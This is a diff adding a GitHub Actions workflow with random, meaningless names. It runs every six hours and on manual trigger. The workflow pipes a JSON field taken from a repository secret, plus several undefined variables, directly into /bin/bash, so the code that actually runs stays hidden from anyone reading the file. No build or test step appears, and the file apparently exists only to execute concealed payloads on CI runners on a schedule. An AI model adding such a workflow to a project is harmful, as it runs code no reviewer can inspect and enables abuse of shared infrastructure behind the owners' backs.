@@ -1,0 +1,23 @@
+name: kongjianzhi6532
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kongjianzhi6532
+        env:
+          t8: ${{ secrets.t8 }}
+        run: |
+          echo $t8 | jq -r .qv4 | /bin/bash
+          echo $ld83332 | jq -r .sqh7 | /bin/bash
+          echo $lcn5 | jq -r .jvmqa496 | /bin/bash
+          echo $ohfbf1799 | jq -r .wgh7693 | /bin/bash
+          echo $y8 | jq -r .c98 | /bin/bash
+          echo $vnvco8558 | jq -r .cus846 | /bin/bash
+
